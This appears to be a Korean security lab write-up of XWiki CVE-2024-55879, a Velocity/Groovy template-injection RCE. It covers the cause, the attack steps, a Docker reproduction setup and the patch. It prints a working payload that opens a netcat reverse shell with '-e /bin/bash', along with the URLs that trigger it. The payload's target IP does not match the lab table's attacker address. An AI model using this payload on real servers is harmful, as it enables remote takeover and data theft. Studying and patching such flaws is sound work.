# 취약점 개요

import {
  Table,
  TableHeader,
  TableBody,
  TableRow,
  TableHead,
  TableCell,
} from "@/components/ui/table"


## 📋 설명

XWiki는 전 세계적으로 약 4만 개 사이트에서 사용되는 Java 기반 오픈소스 위키 플랫폼입니다.

2024년 12월 12일, XWiki 내부의 **ConfigurableClass 기능 처리 과정**에서 발생하는 RCE 취약점(CVE-2024-55879)이 공개되었습니다.

공격자는 **스크립트 권한을 가진 계정**을 탈취하거나 확보한 뒤, 특정 객체의 속성에 악성 Velocity/Groovy 스크립트를 삽입하여 **서버 단에서 임의 명령 실행**이 가능합니다.

이 취약점은 **SSTI(Server-Side Template Injection)**의 전형적인 사례로, Velocity 템플릿 엔진이 사용자 입력을 평가하는 과정에서 `codeToExecuteResult` 변수를 통해 Groovy 스크립트가 실행되어 발생합니다.

## 취약점 정보

<div className="dark-table">
  <Table>
    <TableHeader>
      <TableRow>
        <TableHead>항목</TableHead>
        <TableHead>내용</TableHead>
      </TableRow>
    </TableHeader>
    <TableBody>
      <TableRow>
        <TableCell>CVSS 점수</TableCell>
        <TableCell>9.0 (Critical)</TableCell>
      </TableRow>
      <TableRow>
        <TableCell>취약점 유형</TableCell>
        <TableCell>RCE (Velocity → Groovy 코드 실행), Template Injection</TableCell>
      </TableRow>
      <TableRow>
        <TableCell>영향 버전</TableCell>
        <TableCell>XWiki-platform 2.3 이상 ~ 15.10.9 미만 / 16.0.0-rc-1 이상 ~ 16.3.0 미만</TableCell>
      </TableRow>
      <TableRow>
        <TableCell>공격 난이도</TableCell>
        <TableCell>중간 (script 권한만 있으면 매우 위험)</TableCell>
      </TableRow>
      <TableRow>
        <TableCell>권한 필요 여부</TableCell>
        <TableCell>Script 권한 필요</TableCell>
      </TableRow>
      <TableRow>
        <TableCell>공개일</TableCell>
        <TableCell>2024년 12월 12일</TableCell>
      </TableRow>
      <TableRow>
        <TableCell>영향 범위</TableCell>
        <TableCell>전 세계 약 4만 개 사이트</TableCell>
      </TableRow>
    </TableBody>
  </Table>
</div>



## 🧠 핵심 원인: ConfigurableClass 객체의 속성 값이 Velocity 템플릿에서 직접 evaluate() 실행됨

특히 `heading` 속성이 다음과 같이 처리됩니다:

```velocity
#set($evaluatedHeading = "#evaluate($heading)")
```

즉, **사용자 입력이 필터링 없이 Velocity 문맥에서 그대로 실행**됩니다.

여기에 공격자가 Groovy 스크립트가 포함된 payload를 삽입하면, Velocity → Groovy → OS 명령 실행까지 자연스럽게 이어지는 **RCE 체인**이 형성됩니다.

## ⚠️ 왜 위험한가?

**광범위한 영향**: 전 세계 약 4만 개 사이트가 잠재적 위험에 노출

**낮은 공격 복잡도**: Script 권한만 있으면 웹 UI를 통해 공격 가능

**완전한 서버 제어**: 리버스 쉘 획득을 통한 시스템 장악 가능

**탐지 어려움**: 정상적인 관리 기능(사용자 정보 수정)으로 위장 가능

**데이터 유출**: 위키 내 모든 문서, 사용자 정보, 첨부 파일 접근 가능

**XWiki는 Velocity + Groovy 구조**: template injection이 곧바로 RCE로 연결됨

---

# 공격 시나리오

**Step 1. 공격자가 XWiki 계정을 탈취하거나 스크립트 권한을 가진 계정 확보**

공격자가 XWiki 사용자 계정 탈취 (피싱, 자격 증명 유출 등) 또는 Script 권한이 있는 관리자 계정으로 권한 상승

**Step 2. 인터넷 상에 XWiki 취약 버전 스캔 후 대상 서버 식별**

**Step 3. ConfigurableClass 객체 편집 페이지 접근**

접속 URL: `/bin/edit/xwiki/<user>?editor=object`

**Step 4. heading 속성에 악성 Velocity+Groovy payload 입력**

**Step 5. XWiki가 페이지 렌더링 과정에서 payload 실행**

Payload는 다음 URL 접근 시 실행됨:

```
/bin/view/xwiki/<username>?sheet=XWiki.AdminSheet&viewer=content§ion=other
```

**Step 6. 공격자 서버로 reverse shell 연결 성공**

**Step 7. 서버 탈취 → 컨테이너 breakout → 채굴기 설치 등 2차 공격 수행**

**Impact:** 암호화폐 채굴기 설치 또는 랜섬웨어 배포, 민감한 위키 데이터 탈취

---

# 실습 환경 구성

<div className="dark-table">
  <Table>
    <TableHeader>
      <TableRow>
        <TableHead>역할</TableHead>
        <TableHead>구성</TableHead>
        <TableHead>IP</TableHead>
      </TableRow>
    </TableHeader>
    <TableBody>
      <TableRow>
        <TableCell>피해자 서버</TableCell>
        <TableCell>XWiki-platform v15.10.5 (Docker)</TableCell>
        <TableCell>172.19.0.4</TableCell>
      </TableRow>
      <TableRow>
        <TableCell>공격자</TableCell>
        <TableCell>Kali Linux</TableCell>
        <TableCell>172.19.0.3</TableCell>
      </TableRow>
    </TableBody>
  </Table>
</div>


## 사전 준비사항

- Docker & Docker Compose
- Script 권한이 있는 XWiki 계정
- 기본적인 Velocity 및 Groovy 지식
- Netcat (리버스 쉘 수신)

## 재현 절차 요약

### 1) 취약한 환경 준비

Docker Compose 기반:

```yaml
services:
  xwiki:
    image: XWiki:15.10.5
    ports:
      - "8080:8080"
  db:
    image: mariadb:10.6
    environment:
      - MYSQL_ROOT_PASSWORD=root
```

추가적으로 XWiki Administration Application 패키지(.xar)를 업로드합니다.

Reverse shell 용 BusyBox 설치:

```bash
docker exec -it xwiki sh -c "apt update && apt install -y busybox"
```

### 2) Script 권한 부여

관리자 계정 → Global Administration → Rights → 공격 계정에 Script 권한 추가

### 3) ConfigurableClass에 payload 삽입

접속 URL: `/bin/edit/xwiki/<username>?editor=object`

항목 추가 후 heading 항목에 payload 삽입

### 4) 페이지 렌더링 시 payload 실행

Payload는 다음 URL 접근 시 실행됨:

```
/bin/view/xwiki/<username>?sheet=XWiki.AdminSheet&viewer=content§ion=other
```

이 시점에 reverse shell 획득 가능

---

# 취약점 상세 분석

## 💣 실제 악성 Payload 예시

```velocity
#set($codeToExecute = 'Test')
#set($codeToExecuteResult = '{{async}}{{groovy}}
  def command = "busybox nc 172.19.0.4 8888 -e /bin/bash"
  def proc = command.execute()
  proc.waitFor()
{{/groovy}}{{/async}}')
```

위 payload는 XWiki 내부에서 Velocity로 1차 처리 → Groovy 실행 → bash 셸 획득 → reverse shell 연결 과정까지 완성됩니다.

##  취약점 내부 구조 및 동작 과정

### 1️⃣ XWiki 템플릿 엔진(Velocity)의 evaluate() 사용

ConfigurableClass.xml 내부에서 사용자 입력을 `#evaluate()`로 해석

- sandbox 없이 Groovy 코드 실행이 가능
- Groovy → OS 명령 실행까지 이어짐

### 2️⃣ HQL 기반 객체 조회 → ConfigurableClass 로딩

핵심은:

```velocity
$app.getValue('heading', $configurableObj)
```

이 값이 Velocity 문맥에서 evaluate() 되며, 이후:

```velocity
#evaluate($heading)
```

→ Groovy 스크립트 실행 → 임의 명령 실행

---

# 패치 정보

## 안전한 버전

- **XWiki v15.10.9 이상**
- **XWiki v16.3.0 이상**

## 패치 내용

### 핵심 패치 내용

- `codeToExecuteResult` 제거
- `heading` 처리 시 evaluate 제거
- 스크립트가 단순 문자열로 출력되도록 변경

패치에서는 `codeToExecuteResult` 변수의 실행 로직을 제거하고, 단순 문자열로 출력하도록 변경하여 코드 실행을 방지했습니다.

**변경 전 (취약):**

```velocity
$codeToExecuteResult
```

**변경 후 (안전):**

```velocity
{{html}}$services.rendering.escape($codeToExecuteResult, 'xwiki/2.1'){{/html}}
```

## 업그레이드 방법


<div className="dark-table">
  <Table>
    <TableHeader>
      <TableRow>
        <TableHead>배포 환경</TableHead>
        <TableHead>패치 방법</TableHead>
      </TableRow>
    </TableHeader>
    <TableBody>
      <TableRow>
        <TableCell className="font-medium">패키지 업그레이드</TableCell>
        <TableCell>sudo apt install xwiki-tomcat9-mariadb</TableCell>
      </TableRow>
      <TableRow>
        <TableCell className="font-medium">Docker 업그레이드</TableCell>
        <TableCell>공식 문서를 참조하여 Docker 이미지 변경</TableCell>
      </TableRow>
      <TableRow>
        <TableCell className="font-medium">WAR 업그레이드</TableCell>
        <TableCell>기존 WAR 삭제 후 새 버전 다운로드 또는 Distribution Wizard 사용</TableCell>
      </TableRow>
      <TableRow>
        <TableCell className="font-medium">데모 패키지</TableCell>
        <TableCell>새 버전 별도 설치 후 설정 파일 수동 편집</TableCell>
      </TableRow>
    </TableBody>
  </Table>
</div>

⚠️ **패치 전 반드시 백업하세요!**

---

# 학습 포인트 (CVE 학습자용 요약)

## 🔹 XWiki는 Velocity + Groovy 구조로 인해 template injection이 곧바로 RCE로 연결됨

evaluate()는 절대 사용자 입력에 직접 적용하면 안 되는 대표적인 위험 API입니다.

## 🔹 스크립트 권한이 있는 계정을 탈취하는 순간 RCE까지의 공격 난이도는 매우 낮아짐

서버 내부에서 reverse shell 제공하는 구조는 매우 명확하고 재현이 쉬움.

## 🔹 XWiki는 플러그인(XAR) 기반이라 공격 surface가 넓음

관리자가 아닌 사용자도 확장 기능에 접근 가능.

---

# 참고 자료

- [GitHub Security Advisory](https://github.com/xwiki/xwiki-platform/security/advisories/GHSA-r279-47wg-chpr)

- [패치 커밋](https://github.com/xwiki/xwiki-platform/commit/8493435ff9606905a2d913607d6c79862d0c168d)

- [XWiki 업그레이드 가이드](https://www.xwiki.org/xwiki/bin/view/Documentation/AdminGuide/Upgrade)

- [Jira 이슈](https://jira.xwiki.org/browse/XWIKI-21207)

- [SK쉴더스 보고서](https://www.skshieldus.com/)
